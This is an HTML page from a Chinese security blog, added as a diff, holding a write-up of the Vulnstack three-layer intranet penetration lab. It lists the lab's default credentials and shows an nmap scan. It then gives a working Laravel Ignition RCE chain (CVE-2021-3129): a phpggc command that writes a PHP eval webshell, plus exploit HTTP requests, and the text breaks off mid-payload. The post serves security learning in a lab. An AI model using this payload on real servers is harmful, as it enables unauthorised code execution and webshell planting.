@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>内网渗透-三层网络渗透学习2 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">内网渗透-三层网络渗透学习2</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 18, 2024&nbsp;&nbsp;19:26:35</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本靶机取自红日靶场,这是下载链接和作者blog</span><br><span class="line">http:<span class="regexp">//</span>vulnstack.qiyuanxuetang.net<span class="regexp">/vuln/</span>detail<span class="regexp">/9/</span></span><br><span class="line">https:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/articles/</span>network/<span class="number">264560</span>.html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">整个靶场的网络环境分为三层。从最初的信息收集、外网初探、攻入内网、搭建代理，横向移动，最终拿下域控。整个靶场所涉及的技术点大致如下：</span><br><span class="line">信息收集：</span><br><span class="line">端口扫描</span><br><span class="line">端口服务识别</span><br><span class="line">漏洞利用：</span><br><span class="line">漏洞搜索与利用</span><br><span class="line">Laravel Debug mode RCE（CVE<span class="string">-2021</span><span class="string">-3129</span>）漏洞利用</span><br><span class="line">Docker逃逸</span><br><span class="line">通达OA v11.3 漏洞利用</span><br><span class="line">Linux环境变量提权</span><br><span class="line">Redis 未授权访问漏洞</span><br><span class="line">Linux sudo权限提升（CVE<span class="string">-2021</span><span class="string">-3156</span>）漏洞利用</span><br><span class="line">SSH密钥利用</span><br><span class="line">Windows NetLogon 域内权限提升（CVE<span class="string">-2020</span><span class="string">-1472</span>）漏洞利用</span><br><span class="line">MS14<span class="string">-068</span>漏洞利用</span><br><span class="line">构建隧道：</span><br><span class="line">路由转发与代理</span><br><span class="line">二层网络代理</span><br><span class="line">三层网络代理</span><br><span class="line">横向移动：</span><br><span class="line">内网（域内）信息收集</span><br><span class="line">MS17<span class="string">-010</span></span><br><span class="line">Windows系统NTLM与用户凭据获取</span><br><span class="line">SMB Relay攻击</span><br><span class="line">Psexec远控利用</span><br><span class="line">哈希传递攻击（PTH）</span><br><span class="line">WMI利用</span><br><span class="line">DCOM利用</span><br><span class="line">权限维持：</span><br><span class="line">黄金票据</span><br><span class="line">白银票据</span><br><span class="line">Sid History</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中：</span><br><span class="line">域用户信息</span><br><span class="line">域用户账户和密码如下：</span><br><span class="line">Administrator：Whoami2021</span><br><span class="line"><span class="built_in">whoami</span>：Whoami2021</span><br><span class="line">bunny：Bunny2021</span><br><span class="line">moretz：Moretz2021</span><br><span class="line">Ubuntu 1：web：web2021</span><br><span class="line">Ubuntu 2：ubuntu：ubuntu</span><br><span class="line"></span><br><span class="line">通达OA账户：admin：admin657260</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">（2）服务配置</span><br><span class="line">靶场中各个主机都运行着相应的服务并且没有自启功能，如果你关闭了靶机，再次启动时还需要在相应的主机上启动靶机服务：</span><br><span class="line"></span><br><span class="line">DMZ区的 Ubuntu 需要启动Nginx和Redis服务：</span><br><span class="line"></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line"></span><br><span class="line">/usr/sbin/nginx -c /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line">第二层网络的 Ubuntu需要启动Docker容器：</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> service docker start</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> docker start 8e172820ac78</span><br><span class="line"></span><br><span class="line">第二层网络的 Windows 7（PC 1）需要启动通达OA：</span><br><span class="line"></span><br><span class="line">C:\MYOA\bin\AutoConfig.exe</span><br><span class="line"></span><br><span class="line">五台靶机及其上面的服务需要全部启动，缺一不可。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219193218538.png" alt="image-20241219193218538"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">已知DMZ区服务器的公网ip为<span class="number">192.168.1.122</span></span><br><span class="line">nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.1.122</span>  开了<span class="number">22</span>,<span class="number">80,81,6379</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219195025249.png" alt="image-20241219195025249"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">81端口是个Laravel的站点，Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。并且也给了版本号</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219195406132.png" alt="image-20241219195406132"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用searchsploit搜一下有这么多,一个个看之后感觉php<span class="regexp">/webapps/</span><span class="number">49424</span>.py这个能用</span><br><span class="line">php<span class="regexp">/webapps/</span><span class="number">50538</span>.txt</span><br><span class="line">multiple<span class="regexp">/remote/</span><span class="number">39318</span>.txt</span><br><span class="line">php<span class="regexp">/webapps/</span><span class="number">49424</span>.py</span><br><span class="line">php<span class="regexp">/webapps/</span><span class="number">49112</span>.py</span><br><span class="line">php<span class="regexp">/webapps/</span><span class="number">52000</span>.txt</span><br><span class="line">php<span class="regexp">/webapps/</span><span class="number">44343</span>.py</span><br><span class="line">php<span class="regexp">/webapps/</span><span class="number">49198</span>.txt</span><br><span class="line">macos<span class="regexp">/local/</span><span class="number">50591</span>.py</span><br><span class="line">php<span class="regexp">/webapps/</span><span class="number">50525</span>.txt</span><br><span class="line">linux<span class="regexp">/remote/</span><span class="number">47129</span>.rb</span><br><span class="line">php<span class="regexp">/webapps/</span><span class="number">48166</span>.txt</span><br><span class="line">php<span class="regexp">/webapps/</span><span class="number">46389</span>.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不会用,看原创blog明白利用只需要4步</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）首先使用 phpggc工具生成一条laravel中存在的反序列化利用POC（经过编码后的）：</span><br><span class="line">php -d <span class="string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="string">&quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);&quot;</span> --phar phar -o php://output | <span class="built_in">base64</span> -w 0 | python -c <span class="string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219212106746.png" alt="image-20241219212106746"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">2</span>）发送如下数据包，将Laravel的原日志文件laravel.<span class="keyword">log</span>清空：</span><br><span class="line"></span><br><span class="line">POST /_ignition/<span class="keyword">execute</span>-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.1</span><span class="number">.122</span>:<span class="number">81</span></span><br><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">json</span></span><br><span class="line">Content-Length: <span class="number">328</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219212418269.png" alt="image-20241219212418269"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">3</span>）发送如下数据包，给<span class="keyword">Log</span>增加一次前缀，用于对齐：</span><br><span class="line"></span><br><span class="line">POST /_ignition/<span class="keyword">execute</span>-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.1</span><span class="number">.122</span>:<span class="number">81</span></span><br><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">json</span></span><br><span class="line">Content-Length: <span class="number">163</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">4</span>）将之前生成的编码后的POC作为viewFile的值，发送数据包：</span><br><span class="line"></span><br><span class="line">POST /_ignition/execute-solution HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line">Host: <span class="number">192.168.1.122</span>:<span class="number">81</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">5058</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;=<span class="number">50=00=44=00</span>=<span class="number">39=00=77=00</span>=<span class="number">61=00=48=00</span>=<span class="number">41=00=67=00</span>=<span class="number">58=00=31=00</span>=<span class="number">39=00=49=00</span>=<span class="number">51=00=55=00</span>=<span class="number">78=00=55=00</span>=<span class="number">58=00=30=00</span>=<span class="number">4</span>E=<span class="number">00=50=00=54</span>=<span class="number">00=56=00=42</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=45</span>=<span class="number">00=56=00=53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=37=00=49</span>=<span class="number">00=44=00=38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=44=00=51</span>=<span class="number">00=70=00=75</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=58</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=53</span>=<span class="number">00=57=00=78</span>=<span class="number">00=73=00=64</span>=<span class="number">00=57=00=31</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=56=00=78</span>=<span class="number">00=43=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=39=00=68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=68=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=64=00=63</span>=<span class="number">00=55=00=47</span>=<span class="number">00=56=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=75</span>=<span class="number">00=64=00=48</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=58=00=45</span>=<span class="number">00=52=00=70</span>=<span class="number">00=63=00=33</span>=<span class="number">00=42=00=68</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=59</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=48=00=46</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=56</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=78=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=54</span>=<span class="number">00=47=00=39</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=56</span>=<span class="number">00=32=00=59</span>=<span class="number">00=57=00=78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span 